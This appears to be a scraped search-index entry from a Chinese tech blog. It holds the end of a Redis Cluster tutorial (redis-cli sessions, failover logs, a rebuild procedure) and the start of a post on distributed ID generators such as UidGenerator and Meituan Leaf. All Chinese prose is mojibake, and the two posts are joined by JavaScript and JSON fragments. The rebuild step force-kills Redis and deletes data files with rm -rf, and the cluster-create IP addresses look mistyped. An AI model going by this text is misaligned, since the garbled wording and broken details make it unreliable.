å®¢æˆ·ç«¯ç™»å½•è¿›æŸä¸ªé›†ç¾¤èŠ‚ç‚¹ï¼Œç™»å½•æ—¶éœ€è¦æŒ‡å®šå¯†ç ï¼Œä¸‹é¢å¯ä»¥çœ‹åˆ°æ•°æ®æ”¾å…¥çš„å“ˆå¸Œæ§½ä¸º [12182]ï¼Œå±äº 192.168.1.109:7002 æ‰€ç®¡æ§çš„èŠ‚ç‚¹ï¼Œæ‰€ä»¥å°±ç›´æ¥è·³è½¬åˆ° 192.168.1.109:7002 èŠ‚ç‚¹æ¥è·å–åˆšæ‰æ”¾å…¥çš„æ•°æ® 12345678$ redis-cli -c -p 7001 -a 123456127.0.0.1:7001&gt; set foo hello-&gt; Redirected to slot [12182] located at 192.168.1.109:7002OK192.168.1.109:7002&gt; get foo"hello"192.168.1.109:7002&gt; æŸ¥çœ‹ Redis å½“å‰é›†ç¾¤çš„ä¿¡æ¯ 12345678910111213141516171819202122$ redis-cli -c -p 7001 -a 123456127.0.0.1:7001&gt; cluster infocluster_state:okcluster_slots_assigned:16384cluster_slots_ok:16384cluster_slots_pfail:0cluster_slots_fail:0cluster_known_nodes:6cluster_size:3cluster_current_epoch:7cluster_my_epoch:1cluster_stats_messages_ping_sent:3154cluster_stats_messages_pong_sent:3377cluster_stats_messages_fail_sent:4cluster_stats_messages_auth-ack_sent:1cluster_stats_messages_sent:6536cluster_stats_messages_ping_received:3372cluster_stats_messages_pong_received:3154cluster_stats_messages_meet_received:5cluster_stats_messages_auth-req_received:1cluster_stats_messages_received:6532 æŸ¥çœ‹ Redis ç‰¹å®šèŠ‚ç‚¹çš„çŠ¶æ€ 12345678910111213141516171819202122232425262728293031$ redis-cli --cluster check 192.168.1.109:7003 -a 123456Warning: Using a password with \'-a\' or \'-u\' option on the command line interface may not be safe.192.168.1.109:7003 (cde86683...) -&gt; 0 keys | 5462 slots | 1 slaves.192.168.1.109:7002 (283abb49...) -&gt; 1 keys | 5461 slots | 1 slaves.192.168.1.109:7001 (225e37e5...) -&gt; 0 keys | 5461 slots | 1 slaves.[OK] 1 keys in 3 masters.0.00 keys per slot on average.&gt;&gt;&gt; Performing Cluster Check (using node 192.168.1.109:7003)M: cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003 slots:[5461-10922] (5462 slots) master 1 additional replica(s)S: 1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005 slots: (0 slots) slave replicates 283abb498445ffd6206f24c451ac0b9fb7129383S: 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004 slots: (0 slots) slave replicates cde86683e2d314fd52cf8708f78935c6648ea3c6M: 283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002 slots:[10923-16383] (5461 slots) master 1 additional replica(s)S: f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006 slots: (0 slots) slave replicates 225e37e5bb340467fb58b6f9d14cfb1893bf92d5M: 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001 slots:[0-5460] (5461 slots) master 1 additional replica(s)[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered. æŸ¥çœ‹ Redis æ‰€æœ‰é›†ç¾¤èŠ‚ç‚¹çš„ä¿¡æ¯ 123456789$ redis-cli -c -p 7001 -a 123456127.0.0.1:7001&gt; cluster nodes7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004@17004 master - 0 1616460018217 3 connected 5461-10922225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001@17001 myself,master - 0 1616460015000 1 connected 0-5460f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006@17006 slave 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 0 1616460018000 1 connected1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005@17005 slave 283abb498445ffd6206f24c451ac0b9fb7129383 0 1616460016000 2 connected283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002@17002 master - 0 1616460016000 2 connected 10923-16383cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003@17003 slave 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 0 1616460017000 3 connected éªŒè¯ä¸»ä»åˆ‡æ¢ï¼Œä»ä¸Šé¢çš„é›†ç¾¤ä¿¡æ¯å¯ä»¥è§‚å¯Ÿåˆ° 192.168.1.109:7003 èŠ‚ç‚¹æ˜¯ 192.168.1.109:7004 çš„ Slave èŠ‚ç‚¹ï¼Œå› æ­¤å¯ä»¥ Kill æ‰ 192.168.1.109:7004 Master èŠ‚ç‚¹çš„è¿›ç¨‹ï¼Œç„¶åè§‚å¯Ÿ 192.168.1.109:7003 èŠ‚ç‚¹ä¼šä¸ä¼šé€‰ä¸¾ä¸ºæ–°çš„ Master èŠ‚ç‚¹ï¼Œè‹¥å¯ä»¥åˆ™è¯´æ˜ä¸»ä»åˆ‡æ¢æˆåŠŸï¼Œæ­¤æ—¶ 192.168.1.109:7003 èŠ‚ç‚¹çš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼š 12345678911970:S 21 Jul 2020 22:48:40.080 * Connecting to MASTER 192.168.1.109:700411970:S 21 Jul 2020 22:48:40.080 * MASTER &lt;-&gt; REPLICA sync started11970:S 21 Jul 2020 22:48:40.081 # Error condition on socket for SYNC: Operation now in progress11970:S 21 Jul 2020 22:48:40.982 # Starting a failover election for epoch 7.11970:S 21 Jul 2020 22:48:40.985 # Failover election won: I\'m the new master.11970:S 21 Jul 2020 22:48:40.985 # configEpoch set to 7 after successful failover11970:M 21 Jul 2020 22:48:40.985 * Discarding previously cached master state.11970:M 21 Jul 2020 22:48:40.985 # Setting secondary replication ID to 00c7b21f3980b471d3373792d9d61bedf7e424e6, valid up to offset: 2059. New replication ID is c9f299ab0a8124a56d76e0e8a458135893b4533611970:M 21 Jul 2020 22:48:40.985 # Cluster state changed: ok æœ€åé‡æ–°å¯åŠ¨ 192.168.1.109:7004 èŠ‚ç‚¹ï¼Œå¯ä»¥å‘ç°å®ƒä¼šå˜ä¸º 192.168.1.109:7003 èŠ‚ç‚¹çš„ Slave èŠ‚ç‚¹ 1234567a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004@17004 slave cde86683e2d314fd52cf8708f78935c6648ea3c6 0 1616461490000 7 connected225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001@17001 myself,master - 0 1616461492000 1 connected 0-5460f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006@17006 slave 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 0 1616461492000 1 connected1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005@17005 slave 283abb498445ffd6206f24c451ac0b9fb7129383 0 1616461492010 2 connected283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002@17002 master - 0 1616461491000 2 connected 10923-16383cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003@17003 master - 0 1616461493010 7 connected 5461-10922 Redis é›†ç¾¤é‡å»ºï¼ˆåˆå§‹åŒ–ï¼‰è‹¥ Redis é›†ç¾¤å‡ºç°æ— æ³•æ­£å¸¸ä½¿ç”¨çš„é—®é¢˜ï¼Œå¯ä»¥å°è¯•æ‰§è¡Œä»¥ä¸‹æ“ä½œæ¥é‡å»º Redis é›†ç¾¤æ¥è§£å†³ï¼Œä¸‹è¿°æ“ä½œä¼šåˆ é™¤ Redis çš„æ‰€æœ‰ RDB å¿«ç…§æ•°æ®ï¼Œåˆ‡è®°å…ˆå¤‡ä»½å¥½æ•°æ®å†è¿›è¡Œæ“ä½œã€‚ 12345678910111213141516171819202122232425# å…³é—­æ‰€æœ‰èŠ‚ç‚¹æœåŠ¡å™¨ä¸Šçš„Redis$ pkill -9 redis# åœ¨æ‰€æœ‰èŠ‚ç‚¹æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ˆåˆ‡è®°å…ˆå¤‡ä»½å¥½Redisçš„å¿«ç…§æ•°æ®ï¼‰$ find /usr/local/redis-cluster -type f -iname "dump*.rdb" | xargs rm -rf$ find /usr/local/redis-cluster -type f -iname "nodes_*.conf" | xargs rm -rf$ rm -rf /var/log/redis/*# å¯åŠ¨æ‰€æœ‰èŠ‚ç‚¹æœåŠ¡å™¨ä¸Šçš„Redis$ ./usr/local/redis-cluster/start-cluster.sh# æ‰§è¡Œé›†ç¾¤æ„å»ºæ“ä½œ$ redis-cli -a 123456 --cluster create \\192.168.109:7001 \\192.168.109:7002 \\192.168.109:7003 \\192.168.109:7004 \\192.168.109:7005 \\192.168.109:7006 \\--cluster-replicas 1# æŸ¥è¯¢é›†ç¾¤ä¿¡æ¯å’ŒçŠ¶æ€$ redis-cli -c -p 7001 -a 123456127.0.0.1:7001&gt; cluster info127.0.0.1:7001&gt; cluster nodes å‚è€ƒåšå®¢ Redis 6 é«˜å¯ç”¨é›†ç¾¤æ­å»º Redis ä¸¤å°æœåŠ¡å™¨ç»„é›†ç¾¤ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux ç¼“å­˜"},{title:"åˆ†å¸ƒå¼å”¯ä¸€å…¨å±€ ID è§£å†³æ–¹æ¡ˆä¹‹äºŒ",url:"/posts/221613dd.html",text:'ä¸Šç¯‡ - åˆ†å¸ƒå¼å”¯ä¸€å…¨å±€ ID è§£å†³æ–¹æ¡ˆä¹‹ä¸€ åˆ†å¸ƒå¼å”¯ä¸€å…¨å±€ ID è§£å†³æ–¹æ¡ˆä¹‹ä¸€ 1ã€UidGenerator åˆ†å¸ƒå¼ ID ç”Ÿæˆå™¨1.1ã€æ¦‚è¿°UidGenerator æ˜¯ Java å®ç°çš„ï¼ŒåŸºäº Snowflake ç®—æ³•çš„å”¯ä¸€ ID ç”Ÿæˆå™¨ã€‚UidGenerator ä»¥ç»„ä»¶å½¢å¼å·¥ä½œåœ¨åº”ç”¨é¡¹ç›®ä¸­ï¼Œ æ”¯æŒè‡ªå®šä¹‰ workerId ä½æ•°å’Œåˆå§‹åŒ–ç­–ç•¥ï¼Œ ä»è€Œé€‚ç”¨äº Docker ç­‰è™šæ‹ŸåŒ–ç¯å¢ƒä¸‹å®ä¾‹è‡ªåŠ¨é‡å¯ã€æ¼‚ç§»ç­‰åœºæ™¯ã€‚åœ¨å®ç°ä¸Šï¼Œ UidGenerator é€šè¿‡å€Ÿç”¨æœªæ¥æ—¶é—´æ¥è§£å†³ sequence å¤©ç„¶å­˜åœ¨çš„å¹¶å‘é™åˆ¶ï¼›é‡‡ç”¨ RingBuffer æ¥ç¼“å­˜å·²ç”Ÿæˆçš„ UIDï¼Œ å¹¶è¡ŒåŒ– UID çš„ç”Ÿäº§å’Œæ¶ˆè´¹ï¼Œ åŒæ—¶å¯¹ CacheLine è¡¥é½ï¼Œé¿å…äº†ç”± RingBuffer å¸¦æ¥çš„ç¡¬ä»¶çº§ã€Œä¼ªå…±äº«ã€é—®é¢˜ã€‚ æœ€ç»ˆå•æœº QPS å¯è¾¾ 600 ä¸‡ã€‚ä¾èµ– Java8 åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œ MySQL (å†…ç½® WorkerID åˆ†é…å™¨ï¼Œ å¯åŠ¨é˜¶æ®µé€šè¿‡æ•°æ®åº“è¿›è¡Œåˆ†é…ï¼›å¦‚è‡ªå®šä¹‰å®ç°ï¼Œåˆ™æ•°æ®åº“éå¿…é€‰ä¾èµ–ï¼‰ã€‚ 1.2ã€ç»“æ„Snowflake ç®—æ³•æè¿°ï¼šæŒ‡å®šæœºå™¨ &amp; åŒä¸€æ—¶åˆ» &amp; æŸä¸€å¹¶å‘åºåˆ—ï¼Œæ˜¯å”¯ä¸€çš„ã€‚æ®æ­¤å¯ç”Ÿæˆä¸€ä¸ª 64 bit çš„å”¯ä¸€ IDï¼ˆLong å‹ï¼‰ï¼Œé»˜è®¤é‡‡ç”¨ä¸‹å›¾å­—èŠ‚åˆ†é…æ–¹å¼ï¼š signï¼ˆ1bitï¼‰ï¼šç¬¦å·ä½ï¼Œå›ºå®šæ˜¯ 0ï¼Œè¡¨ç¤ºå…¨éƒ¨ ID éƒ½æ˜¯æ­£æ•´æ•° delta seconds (28 bits)ï¼šå½“å‰æ—¶é—´ï¼Œç›¸å¯¹äºæ—¶é—´åŸºç‚¹ 2016-05-20 çš„å¢é‡å€¼ï¼Œå•ä½ä¸ºç§’ï¼Œæœ€å¤šå¯æ”¯æŒçº¦ 8.7 å¹´ worker id (22 bits)ï¼šæœºå™¨ IDï¼Œæœ€å¤šå¯æ”¯æŒçº¦ 420w æ¬¡æœºå™¨å¯åŠ¨ã€‚å†…ç½®å®ç°ä¸ºåœ¨å¯åŠ¨æ—¶ç”±æ•°æ®åº“åˆ†é…ï¼Œé»˜è®¤åˆ†é…ç­–ç•¥ä¸ºç”¨åå³å¼ƒï¼Œåç»­å¯æä¾›å¤ç”¨ç­–ç•¥ sequence (13 bits)ï¼šæ¯ç§’ä¸‹çš„å¹¶å‘åºåˆ—ï¼Œ13 bits å¯æ”¯æŒæ¯ç§’ 8192 ä¸ªå¹¶å‘ 2ã€Leaf åˆ†å¸ƒå¼ ID ç”Ÿæˆç³»ç»ŸLeaf æä¾›äº†ä¸¤ç§æ–¹æ¡ˆï¼Œåˆ†åˆ«æ˜¯ Leaf-segment å’Œ Leaf-snowflake æ–¹æ¡ˆï¼Œå‰è€…ä¾èµ– MySQLï¼Œåè€…ä¾èµ– ZooKeeperã€‚ 2.1ã€Leaf-segment æ–¹æ¡ˆ2.1.1ã€æ¦‚è¿°Leaf-segment æ–¹æ¡ˆï¼Œåœ¨ä½¿ç”¨ MySQL è‡ªå¢ ID çš„æ–¹æ¡ˆä¸Šï¼Œåšäº†å¦‚ä¸‹æ”¹å˜ï¼š åŸæ–¹æ¡ˆæ¯æ¬¡è·å– ID éƒ½å¾—è¯»å†™ä¸€æ¬¡æ•°æ®åº“ï¼Œé€ æˆæ•°æ®åº“å‹åŠ›å¤§ã€‚æ”¹ä¸ºåˆ©ç”¨ Proxy Server æ‰¹é‡è·å–ï¼Œæ¯æ¬¡è·å–ä¸€ä¸ª segmentï¼ˆstep å†³å®šå¤§å°ï¼‰å·æ®µçš„å€¼ã€‚ç”¨å®Œä¹‹åå†å»æ•°æ®åº“è·å–æ–°çš„å·æ®µï¼Œå¯ä»¥å¤§å¤§çš„å‡è½»æ•°æ®åº“çš„å‹åŠ› å„ä¸ªä¸šåŠ¡ä¸åŒçš„ ID ç”Ÿæˆéœ€æ±‚ç”¨ biz_tag å­—æ®µæ¥åŒºåˆ†ï¼Œæ¯ä¸ª biz-tag çš„ ID è·å–ç›¸äº’éš”ç¦»ï¼Œäº’ä¸å½±å“ã€‚å¦‚æœä»¥åæœ‰æ€§èƒ½éœ€æ±‚éœ€è¦å¯¹æ•°æ®åº“æ‰©å®¹ï¼Œä¸éœ€è¦ä¸Šè¿°å¤æ‚çš„æ‰©å®¹æ“ä½œï¼Œåªéœ€è¦å¯¹ biz_tag åˆ†åº“åˆ†è¡¨å°±è¡Œ 123456789+-------------+--------------+------+-----+-------------------+-----------------------------+| Field | Type | Null | Key | Default | Extra |+-------------+--------------+------+-----+-------------------+-----------------------------+| biz_tag | varchar(128) | NO | PRI | | || max_id | bigint(20) | NO | | 1 | || step | int(11) | NO | | NULL | || desc | varchar(256) | YES | | NULL | || update_time | timestamp | NO | | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |+-------------+--------------+------+-----+-------------------+-----------------------------+ é‡è¦å­—æ®µè¯´æ˜ï¼š biz_tagï¼šç”¨æ¥åŒºåˆ†ä¸šåŠ¡ max_idï¼šè¡¨ç¤ºè¯¥ biz_tag ç›®å‰æ‰€è¢«åˆ†é…çš„ ID æ®µçš„æœ€å¤§å€¼ stepï¼šè¡¨ç¤ºæ¯æ¬¡åˆ†é…çš„å·æ®µé•¿åº¦ã€‚åŸæ¥è·å– ID æ¯æ¬¡éƒ½éœ€è¦å†™æ•°æ®åº“ï¼Œç°åœ¨åªéœ€è¦æŠŠ step è®¾ç½®å¾—è¶³å¤Ÿå¤§ï¼Œæ¯”å¦‚ 1000ã€‚é‚£ä¹ˆåªæœ‰å½“ 1000 ä¸ªå·è¢«æ¶ˆè€—å®Œäº†ä¹‹åæ‰ä¼šå»é‡æ–°è¯»å†™ä¸€æ¬¡æ•°æ®åº“ï¼Œè¯»å†™æ•°æ®åº“çš„é¢‘ç‡ä» 1 å‡å°åˆ°äº† 1 / step 2.1.2ã€æ¶æ„ test_tag åœ¨ç¬¬ä¸€å° Leaf æœºå™¨ä¸Šæ˜¯ 11000 çš„å·æ®µï¼Œå½“è¿™ä¸ªå·æ®µç”¨å®Œæ—¶ï¼Œä¼šå»åŠ è½½å¦ä¸€ä¸ªé•¿åº¦ä¸º step=1000 çš„å·æ®µï¼Œå‡è®¾å¦å¤–ä¸¤å°å·æ®µéƒ½æ²¡æœ‰æ›´æ–°ï¼Œè¿™ä¸ªæ—¶å€™ç¬¬ä¸€å°æœºå™¨æ–°åŠ è½½çš„å·æ®µå°±åº”è¯¥æ˜¯ 30014000ã€‚åŒæ—¶æ•°æ®åº“å¯¹åº”çš„ biz_tag è¿™æ¡æ•°æ®çš„ max_id ä¼šä» 3000 è¢«æ›´æ–°æˆ 4000ï¼Œæ›´æ–°å·æ®µçš„ SQL è¯­å¥å¦‚ä¸‹ï¼š 1234BeginUPDATE table SET max_id=max_id+step WHERE biz_tag=xxxSELECT tag, max_id, step FROM table WHERE biz_tag=xxxCommit 2.1.3ã€ä¼˜ç¼ºç‚¹ä¼˜ç‚¹ï¼š Leaf æœåŠ¡å¯ä»¥å¾ˆæ–¹ä¾¿çš„çº¿æ€§æ‰©å±•ï¼Œæ€§èƒ½å®Œå…¨èƒ½å¤Ÿæ”¯æ’‘å¤§å¤šæ•°ä¸šåŠ¡åœºæ™¯ ID æ˜¯è¶‹åŠ¿é€’å¢çš„ 8 byte çš„ 64 ä½æ•°å­—ï¼Œæ»¡è¶³ä¸Šè¿°æ•°æ®åº“å­˜å‚¨çš„ä¸»é”®è¦æ±‚ å¯ä»¥è‡ªå®šä¹‰ max_id çš„å¤§å°ï¼Œéå¸¸æ–¹ä¾¿ä¸šåŠ¡ä»åŸæœ‰çš„ ID æ–¹å¼ä¸Šè¿ç§»è¿‡æ¥ å®¹ç¾æ€§é«˜ï¼ŒLeaf æœåŠ¡å†…éƒ¨æœ‰å·æ®µç¼“å­˜ï¼Œå³ä½¿æ•°æ®åº“å®•æœºï¼ŒçŸ­æ—¶é—´å†… Leaf ä»èƒ½æ­£å¸¸å¯¹å¤–æä¾›æœåŠ¡ ç¼ºç‚¹ï¼š æ•°æ®åº“å®•æœºä¼šé€ æˆæ•´ä¸ªç³»ç»Ÿä¸å¯ç”¨ ID ä¸å¤Ÿéšæœºï¼Œèƒ½å¤Ÿæ³„éœ²å‘å·æ•°é‡çš„ä¿¡æ¯ï¼Œä¸å¤ªå®‰å…¨ TP999 æ•°æ®æ³¢åŠ¨å¤§ï¼Œå½“å·æ®µä½¿ç”¨å®Œä¹‹åï¼ŒID ç”Ÿæˆçš„æ€§èƒ½ç“¶é¢ˆè¿˜æ˜¯ä¼šåœ¨æ›´æ–°æ•°æ®åº“çš„ I/O ä¸Šï¼ŒTP999 æ•°æ®ä¼šå‡ºç°å¶å°”çš„å°–åˆº 2.1.4ã€é«˜å¯ç”¨å®¹ç¾é’ˆå¯¹ç¬¬ä¸€ä¸ªç¼ºç‚¹æ•°æ®åº“å¯ç”¨æ€§é—®é¢˜ï¼Œç›®å‰é‡‡ç”¨ä¸€ä¸»ä¸¤ä»çš„æ–¹å¼ï¼ŒåŒæ—¶åˆ†æœºæˆ¿éƒ¨ç½²ï¼ŒMaster å’Œ Slave ä¹‹é—´é‡‡ç”¨åŠåŒæ­¥æ–¹å¼åŒæ­¥æ•°æ®ã€‚åŒæ—¶ä½¿ç”¨ Atlas æ•°æ®åº“ä¸­é—´ä»¶ï¼ˆå·²å¼€æºï¼Œæ”¹åä¸º DBProxyï¼‰åšä¸»ä»åˆ‡æ¢ã€‚å½“ç„¶è¿™ç§æ–¹æ¡ˆåœ¨ä¸€äº›æƒ…å†µä¼šé€€åŒ–æˆå¼‚æ­¥æ¨¡å¼ï¼Œç”šè‡³åœ¨éå¸¸æç«¯æƒ…å†µä¸‹ä»ç„¶ä¼šé€ æˆæ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µï¼Œä½†æ˜¯å‡ºç°çš„æ¦‚ç‡éå¸¸å°ã€‚å¦‚æœç³»ç»Ÿè¦ä¿è¯ 100% çš„æ•°æ®å¼ºä¸€è‡´ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨ ç±» Paxos ç®—æ³• å®ç°çš„å¼ºä¸€è‡´ MySQL æ–¹æ¡ˆï¼Œå¦‚ MySQL 5.7 GA çš„ MySQL Group Replicationï¼Œä½†æ˜¯è¿ç»´æˆæœ¬å’Œç²¾åŠ›éƒ½ä¼šç›¸åº”çš„å¢åŠ ï¼Œæ ¹æ®å®é™…æƒ…å†µé€‰å‹å³å¯ã€‚åœ¨ç¾å›¢ç‚¹è¯„å†…éƒ¨ï¼ŒLeaf æœåŠ¡åˆ† IDC éƒ¨ç½²ï¼Œå†…éƒ¨çš„æœåŠ¡åŒ–æ¡†æ¶æ˜¯ MTthrift RPCã€‚æœåŠ¡è°ƒç”¨çš„æ—¶å€™ï¼Œæ ¹æ®è´Ÿè½½å‡è¡¡ç®—æ³•ä¼šä¼˜å…ˆè°ƒç”¨åŒæœºæˆ¿çš„ Leaf æœåŠ¡ã€‚åœ¨è¯¥ IDC å†… Leaf æœåŠ¡ä¸å¯ç”¨çš„æ—¶å€™æ‰ä¼šé€‰æ‹©å…¶ä»–æœºæˆ¿çš„ Leaf æœåŠ¡ã€‚åŒæ—¶æœåŠ¡æ²»ç†å¹³å° OCTO è¿˜æä¾›äº†é’ˆå¯¹æœåŠ¡çš„è¿‡è½½ä¿æŠ¤ã€ä¸€é”®æˆªæµã€åŠ¨æ€æµé‡åˆ†é…ç­‰å¯¹æœåŠ¡çš„ä¿æŠ¤æªæ–½ã€‚ 2.1.5ã€åŒ Buffer ä¼˜åŒ–é’ˆå¯¹ä¸Šè¿°ç¬¬ä¸‰ä¸ªç¼ºç‚¹ï¼ŒLeaf-segment åšäº†ä¸€äº›ä¼˜åŒ–ï¼Œç®€å•çš„è¯´å°±æ˜¯ï¼šLeaf å–å·æ®µçš„æ—¶æœºæ˜¯åœ¨å·æ®µæ¶ˆè€—å®Œçš„æ—¶å€™è¿›è¡Œçš„ï¼Œä¹Ÿå°±æ„å‘³ç€å·æ®µä¸´ç•Œç‚¹çš„ ID ä¸‹å‘æ—¶é—´å–å†³äºä¸‹ä¸€æ¬¡ä»æ•°æ®åº“å–å›å·æ®µçš„æ—¶é—´ï¼Œå¹¶ä¸”åœ¨è¿™æœŸé—´è¿›æ¥çš„è¯·æ±‚ä¹Ÿä¼šå› ä¸ºæ•°æ®åº“å·æ®µæ²¡æœ‰å–å›æ¥ï¼Œå¯¼è‡´çº¿ç¨‹é˜»å¡ã€‚å¦‚æœè¯·æ±‚æ•°æ®åº“çš„ç½‘ç»œå’Œæ•°æ®åº“çš„æ€§èƒ½ç¨³å®šï¼Œè¿™ç§æƒ…å†µå¯¹ç³»ç»Ÿçš„å½±å“æ˜¯ä¸å¤§çš„ï¼Œä½†æ˜¯å‡å¦‚å–æ•°æ®åº“çš„æ—¶å€™ç½‘ç»œå‘ç”ŸæŠ–åŠ¨ï¼Œæˆ–è€…æ•°æ®åº“å‘ç”Ÿæ…¢æŸ¥è¯¢å°±ä¼šå¯¼è‡´æ•´ä¸ªç³»ç»Ÿçš„å“åº”æ—¶é—´å˜æ…¢ã€‚ä¸ºæ­¤ï¼Œå¸Œæœ›æ•°æ®åº“å–å·æ®µçš„è¿‡ç¨‹èƒ½å¤Ÿåšåˆ°æ— é˜»å¡ï¼Œä¸éœ€è¦åœ¨æ•°æ®åº“å–å·æ®µçš„æ—¶å€™é˜»å¡è¯·æ±‚çº¿ç¨‹ï¼Œå³å½“å·æ®µæ¶ˆè´¹åˆ°æŸä¸ªç‚¹æ—¶å°±å¼‚æ­¥çš„æŠŠä¸‹ä¸€ä¸ªå·æ®µåŠ è½½åˆ°å†…å­˜ä¸­ã€‚è€Œä¸éœ€è¦ç­‰åˆ°å·æ®µç”¨å°½çš„æ—¶å€™æ‰å»æ›´æ–°å·æ®µã€‚è¿™æ ·åšå°±å¯ä»¥å¾ˆå¤§ç¨‹åº¦ä¸Šçš„é™ä½ç³»ç»Ÿçš„ TP999 æŒ‡æ ‡ã€‚è¯¦ç»†å®ç°å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š é‡‡ç”¨åŒ Buffer çš„æ–¹å¼ï¼ŒLeaf æœåŠ¡å†…éƒ¨æœ‰ä¸¤ä¸ªå·æ®µç¼“å­˜åŒº segmentã€‚å½“å‰å·æ®µå·²ä¸‹å‘ 10% æ—¶ï¼Œå¦‚æœä¸‹ä¸€ä¸ªå·æ®µæœªæ›´æ–°ï¼Œåˆ™å¦å¯ä¸€ä¸ªæ›´æ–°çº¿ç¨‹å»æ›´æ–°ä¸‹ä¸€ä¸ªå·æ®µã€‚å½“å‰å·æ®µå…¨éƒ¨ä¸‹å‘å®Œåï¼Œå¦‚æœä¸‹ä¸ªå·æ®µå‡†å¤‡å¥½äº†åˆ™åˆ‡æ¢åˆ°ä¸‹ä¸ªå·æ®µä¸ºå½“å‰ segment æ¥ç€ä¸‹å‘ï¼Œå¾ªç¯å¾€å¤ æ¯ä¸ª biz-tag éƒ½æœ‰æ¶ˆè´¹é€Ÿåº¦ç›‘æ§ï¼Œé€šå¸¸æ¨è segment é•¿åº¦è®¾ç½®ä¸ºæœåŠ¡é«˜å³°æœŸå‘å· QPS çš„ 600 å€ï¼ˆ10 åˆ†é’Ÿï¼‰ï¼Œè¿™æ ·å³ä½¿æ•°æ®åº“å®•æœºï¼ŒLeaf ä»èƒ½æŒç»­å‘å· 10-20 åˆ†é’Ÿä¸å—å½±å“ æ¯æ¬¡è¯·æ±‚æ¥ä¸´æ—¶éƒ½ä¼šåˆ¤æ–­ä¸‹ä¸ªå·æ®µçš„çŠ¶æ€ï¼Œä»è€Œæ›´æ–°æ­¤å·æ®µï¼Œæ‰€ä»¥å¶å°”çš„ç½‘ç»œæŠ–åŠ¨ä¸ä¼šå½±å“ä¸‹ä¸ªå·æ®µçš„æ›´æ–° 2.2ã€Leaf-snowflake æ–¹æ¡ˆ2.2.1ã€æ¦‚è¿°Leaf-segment æ–¹æ¡ˆå¯ä»¥ç”Ÿæˆè¶‹åŠ¿é€’å¢çš„ IDï¼ŒåŒæ—¶ ID æ˜¯å¯è®¡ç®—çš„ï¼Œä¸é€‚ç”¨äºè®¢å• ID ç”Ÿæˆåœºæ™¯ï¼Œæ¯”å¦‚ç«å¯¹åœ¨ä¸¤å¤©ä¸­åˆ 12 ç‚¹åˆ†åˆ«ä¸‹å•ï¼Œé€šè¿‡è®¢å• ID ç›¸å‡å°±èƒ½å¤§è‡´è®¡ç®—å‡ºå…¬å¸ä¸€å¤©çš„è®¢å•é‡ï¼Œè¿™ä¸ªæ˜¯ä¸èƒ½å¿å—çš„ã€‚é¢å¯¹è¿™ä¸€é—®é¢˜ï¼Œç¾å›¢ç‚¹è¯„æä¾›äº† Leaf-snowflake æ–¹æ¡ˆã€‚ 2.2.2ã€æ¶æ„Leaf-snowflake æ–¹æ¡ˆå®Œå…¨æ²¿ç”¨ SnowFlake æ–¹æ¡ˆçš„ bit ä½è®¾è®¡ï¼Œå³æ˜¯ 1+41+10+12 çš„æ–¹å¼ç»„è£… IDã€‚å¯¹äº workerId çš„åˆ†é…ï¼Œå½“æœåŠ¡é›†ç¾¤æ•°é‡è¾ƒå°çš„æƒ…å†µä¸‹ï¼Œå®Œå…¨å¯ä»¥æ‰‹åŠ¨é…ç½®ã€‚Leaf æœåŠ¡è§„æ¨¡è¾ƒå¤§ï¼ŒåŠ¨æ‰‹é…ç½®æˆæœ¬å¤ªé«˜ã€‚æ‰€ä»¥ä½¿ç”¨ ZooKeeper æŒä¹…é¡ºåºèŠ‚ç‚¹çš„ç‰¹æ€§è‡ªåŠ¨å¯¹ SnowFlake èŠ‚ç‚¹é…ç½® wokerIdã€‚Leaf-snowflake æ˜¯æŒ‰ç…§ä¸‹é¢å‡ ä¸ªæ­¥éª¤å¯åŠ¨çš„ï¼š å¯åŠ¨ Leaf-snowflake æœåŠ¡ï¼Œè¿æ¥ ZooKeeperï¼Œåœ¨ leaf_forever çˆ¶èŠ‚ç‚¹ä¸‹æ£€æŸ¥è‡ªå·±æ˜¯å¦å·²ç»æ³¨å†Œè¿‡ï¼ˆæ˜¯å¦æœ‰è¯¥é¡ºåºå­èŠ‚ç‚¹ï¼‰ 